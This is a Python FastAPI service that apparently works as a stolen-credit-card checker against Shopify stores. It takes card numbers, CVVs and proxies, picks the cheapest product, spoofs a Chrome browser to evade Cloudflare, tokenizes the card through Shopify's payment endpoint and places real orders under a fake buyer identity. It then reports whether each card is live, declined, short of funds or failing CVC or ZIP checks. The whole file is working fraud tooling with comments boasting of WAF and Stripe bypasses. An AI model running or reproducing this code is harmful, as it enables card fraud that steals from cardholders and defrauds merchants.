from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi.requests import AsyncSession
import re
import uuid
import random
import asyncio
from html import unescape

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

def safe_response(msg, price, gate):
    clean_msg = msg.replace("Proxy", "Prx").replace("proxy", "prx").replace("Connection", "Conn").replace("connection", "conn").replace("Timeout", "T-out").replace("timeout", "t-out")
    clean_price = str(price).replace('$', '').strip() if price else "-"
    return {"Response": clean_msg, "Price": clean_price, "Gate": gate}

async def get_micro_product(session, store_url):
    endpoints = [f"{store_url}/products.json?limit=250", f"{store_url}/collections/all/products.json?limit=250"]
    for ep in endpoints:
        try:
            res = await session.get(ep, headers={"Accept": "application/json"}, timeout=15)
            if res.status_code == 200:
                products = res.json().get('products', [])
                valid = []
                for prod in products:
                    for var in prod.get('variants', []):
                        if var.get('available'):
                            try:
                                p = float(var.get('price', 0))
                                if p > 10000: p = p / 100.0
                                if 0.1 <= p <= 150.0: valid.append((var.get('id'), p))
                            except: pass
                if valid:
                    valid.sort(key=lambda x: x[1])
                    return str(valid[0][0]), "{:.2f}".format(valid[0][1])
        except: continue
    return None, "-"

async def check_shopify_ultimate(cc_info, store_url, proxy):
    try:
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return safe_response("Invalid CC Format", "-", "Shopify Stealth")
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = store_url.rstrip('/')
        scope_host = store_url.replace("https://", "").replace("http://", "")
        proxies = {"http": format_proxy(proxy), "https": format_proxy(proxy)} if proxy else None

        buyer = {
            "email": f"j.doe{random.randint(10000,99999)}@gmail.com", "first_name": "John", "last_name": "Doe",
            "address1": "123 Main Street", "city": "New York", "province": "NY", "zip": "10001", "country": "US", "phone": "2125551234"
        }

        async with AsyncSession(impersonate="chrome110", proxies=proxies, timeout=60) as session:
            # 1. Product Fetching
            variant_id, price = await get_micro_product(session, store_url)
            if not variant_id: return safe_response("No suitable product found", "-", "Shopify Stealth")

            # 2. CF WAF Bypass Entry (The Permalink Strategy)
            chk_url = f"{store_url}/cart/{variant_id}:1"
            headers_get = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1"
            }
            res_chk = await session.get(chk_url, allow_redirects=True, headers=headers_get)
            final_url = str(res_chk.url)
            html_chk = res_chk.text

            # 3. Fallback Mechanism (If permalink is disabled, use AJAX Add)
            if "/cart" in final_url and "/checkout" not in final_url:
                await session.post(f"{store_url}/cart/add.js", data={"id": variant_id, "quantity": "1"}, headers={"X-Requested-With": "XMLHttpRequest", "Accept": "application/json"})
                res_chk = await session.get(f"{store_url}/checkout", allow_redirects=True, headers=headers_get)
                final_url = str(res_chk.url)
                html_chk = res_chk.text

            # 4. CF Diagnostics
            if res_chk.status_code in [403, 429] or "cloudflare" in html_chk.lower() or "just a moment" in html_chk.lower():
                return safe_response("Cloudflare WAF Blocked Proxy IP", price, "Shopify Stealth")

            # 5. Advanced Token Radar (Based on neww.py)
            is_graphql = False
            session_token, classic_token, checkout_token = None, None, None

            meta_match = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', html_chk)
            if meta_match:
                is_graphql = True
                session_token = unescape(meta_match.group(1)).strip('"')
                ct_match = re.search(r'/checkouts/(?:cn|c|unstable)/([^/]+)', final_url)
                if ct_match: checkout_token = ct_match.group(1)
                else:
                    ct_js = re.search(r'checkout_token"\s*:\s*"([^"]+)"', html_chk)
                    checkout_token = ct_js.group(1) if ct_js else "unknown"
            else:
                patterns = [
                    r'name=["\']authenticity_token["\'][^>]*?value=["\']([^"\']+)["\']', 
                    r'value=["\']([^"\']+)["\'][^>]*?name=["\']authenticity_token["\']', 
                    r'<meta\s+name=["\']csrf-token["\']\s+content=["\']([^"\']+)["\']'
                ]
                for p in patterns:
                    match = re.search(p, html_chk, re.IGNORECASE)
                    if match:
                        classic_token = unescape(match.group(1))
                        break

            if not is_graphql and not classic_token:
                title = re.search(r'<title>([^<]+)</title>', html_chk)
                page_title = title.group(1).strip() if title else "Unknown"
                return safe_response(f"Token Extractor Failed ({page_title[:15]})", price, "Shopify Stealth")

            # 6. Secure PCI Tokenization (Bypass Stripe Blocks)
            pci_headers = {"Origin": "https://checkout.pci.shopifyinc.com", "Referer": "https://checkout.pci.shopifyinc.com/", "Content-Type": "application/json", "Accept": "application/json"}
            res_pci = await session.post("https://checkout.pci.shopifyinc.com/sessions", json={"credit_card": {"number": cc, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers)
            if res_pci.status_code != 200: return safe_response("Stripe WAF Blocked IP", price, "Shopify Stealth")
            card_session_id = res_pci.json().get("id")

            # =================================================================
            # المسار الأول: GraphQL Extensibility (Shopify 2024/2025)
            # =================================================================
            if is_graphql:
                gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
                gql_headers = {'shopify-checkout-client': 'checkout-web/1.0', 'shopify-checkout-source': f'id="{checkout_token}"', 'x-checkout-web-source-id': checkout_token, 'x-checkout-one-session-token': session_token}
                merch_id = str(uuid.uuid4())
                addr_data = {"address1": buyer["address1"], "city": buyer["city"], "countryCode": buyer["country"], "firstName": buyer["first_name"], "lastName": buyer["last_name"], "zoneCode": buyer["province"], "postalCode": buyer["zip"], "phone": buyer["phone"]}
                
                prop_query = """query Proposal($delivery:DeliveryTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$sessionInput:SessionTokenInput!){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity}}){result{...on NegotiationResultAvailable{queueToken}}}}}"""
                prop_vars = {"delivery": {"deliveryLines": [{"destination": {"partialStreetAddress": addr_data}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": True, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True}, "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": addr_data}}, "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]}, "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"]}, "sessionInput": {"sessionToken": session_token}}
                res_prop = await session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
                queue_token = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
                if not queue_token: return safe_response("GraphQL Negotiate Failed", price, "Shopify Stealth (GQL)")

                await asyncio.sleep(1)

                sub_url = f"{store_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
                sub_query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitRejected{errors{code localizedMessage}}...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}}}"""
                sub_vars = {"attemptToken": f"{checkout_token}-{uuid.uuid4().hex[:10]}", "input": {"sessionInput": {"sessionToken": session_token}, "queueToken": queue_token, "delivery": {"deliveryLines": [{"destination": {"streetAddress": addr_data}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": False, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}, "options": {"phone": buyer["phone"]}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True}, "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]}, "payment": {"totalAmount": {"any": True}, "paymentLines": [{"paymentMethod": {"directPaymentMethod": {"paymentMethodIdentifier": "bfe4013b52b37df95b64c063a41da319", "sessionId": card_session_id, "billingAddress": {"streetAddress": addr_data}}}, "amount": {"any": True}}], "billingAddress": {"streetAddress": addr_data}}, "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "phoneCountryCode": "US"}}}
                res_sub = await session.post(sub_url, json={"operationName": "SubmitForCompletion", "query": sub_query, "variables": sub_vars}, headers=gql_headers)
                receipt_id = res_sub.json().get('data', {}).get('submitForCompletion', {}).get('receipt', {}).get('id')
                if not receipt_id: return safe_response("GraphQL Submit Rejected", price, "Shopify Stealth (GQL)")

                poll_url = f"{store_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
                poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}...on OrderCreationFailure{paymentsHaveBeenReverted}}}...on ActionRequiredReceipt{id}}}"""
                for _ in range(6):
                    res_poll = await session.post(poll_url, json={"operationName": "PollForReceipt", "query": poll_query, "variables": {"receiptId": receipt_id, "sessionToken": session_token}}, headers=gql_headers)
                    if res_poll.status_code == 200:
                        p_type = res_poll.json().get('data', {}).get('receipt', {}).get('__typename')
                        if p_type == 'ProcessedReceipt': return safe_response("Order completed 💎", price, "Shopify Stealth (GQL)")
                        elif p_type == 'FailedReceipt':
                            err = res_poll.json().get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'DECLINED')
                            if "INSUFFICIENT" in err: return safe_response("Insufficient Funds", price, "Shopify Stealth (GQL)")
                            elif "CVC" in err: return safe_response("Incorrect CVC", price, "Shopify Stealth (GQL)")
                            elif "ZIP" in err or "ADDRESS" in err: return safe_response("ZIP Code Mismatch", price, "Shopify Stealth (GQL)")
                            elif "DO_NOT_HONOR" in err: return safe_response("Do Not Honor", price, "Shopify Stealth (GQL)")
                            return safe_response(f"Declined: {err}", price, "Shopify Stealth (GQL)")
                    await asyncio.sleep(1.5)
                return safe_response("Timeout waiting for Response", price, "Shopify Stealth (GQL)")
            
            # =================================================================
            # المسار الثاني: Classic HTML (Shopify Old Gen)
            # =================================================================
            else:
                addr_payload = {"_method": "patch", "authenticity_token": classic_token, "previous_step": "contact_information", "step": "shipping_method", "checkout[email]": buyer["email"], "checkout[shipping_address][first_name]": buyer["first_name"], "checkout[shipping_address][last_name]": buyer["last_name"], "checkout[shipping_address][address1]": buyer["address1"], "checkout[shipping_address][city]": buyer["city"], "checkout[shipping_address][country]": buyer["country"], "checkout[shipping_address][province]": buyer["province"], "checkout[shipping_address][zip]": buyer["zip"], "checkout[shipping_address][phone]": buyer["phone"]}
                res_addr = await session.post(final_url, data=addr_payload, allow_redirects=True, headers={"Referer": final_url})
                
                match2 = re.search(r'name=["\']authenticity_token["\'][^>]*?value=["\']([^"\']+)["\']', res_addr.text)
                classic_token2 = unescape(match2.group(1)) if match2 else classic_token
                
                res_ship = await session.post(str(res_addr.url), data={"_method": "patch", "authenticity_token": classic_token2, "previous_step": "shipping_method", "step": "payment_method"}, allow_redirects=True, headers={"Referer": str(res_addr.url)})
                
                gate_match = re.search(r'value=["\'](\d+)["\'][^>]*?name=["\']checkout\[payment_gateway\]["\']', res_ship.text)
                gateway_id = gate_match.group(1) if gate_match else "1"
                
                match3 = re.search(r'name=["\']authenticity_token["\'][^>]*?value=["\']([^"\']+)["\']', res_ship.text)
                classic_token3 = unescape(match3.group(1)) if match3 else classic_token2

                pay_payload = {"_method": "patch", "authenticity_token": classic_token3, "previous_step": "payment_method", "step": "", "s": card_session_id, "checkout[payment_gateway]": gateway_id, "checkout[credit_card][vault]": "false", "complete": "1"}
                res_pay = await session.post(str(res_ship.url), data=pay_payload, allow_redirects=True, headers={"Referer": str(res_ship.url)})
                res_text = res_pay.text.lower()
                
                if "thank you" in res_text or "order completed" in res_text: return safe_response("Order completed 💎", price, "Shopify Stealth (Classic)")
                elif "insufficient" in res_text: return safe_response("Insufficient Funds", price, "Shopify Stealth (Classic)")
                elif "incorrect_cvc" in res_text or "security code" in res_text: return safe_response("Incorrect CVC", price, "Shopify Stealth (Classic)")
                elif "zip code" in res_text or "avs" in res_text: return safe_response("ZIP Code Mismatch", price, "Shopify Stealth (Classic)")
                elif "do not honor" in res_text: return safe_response("Do Not Honor", price, "Shopify Stealth (Classic)")
                else:
                    err = re.search(r'class="field__message field__message--error">([^<]+)<', res_pay.text)
                    return safe_response(err.group(1).strip() if err else "Declined / Custom Gate Block", price, "Shopify Stealth (Classic)")

    except Exception as e:
        return safe_response(f"Sys_Err: {str(e)[:40]}", "-", "Shopify Stealth")

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    return JSONResponse(content=await check_shopify_ultimate(cc, url, proxy))
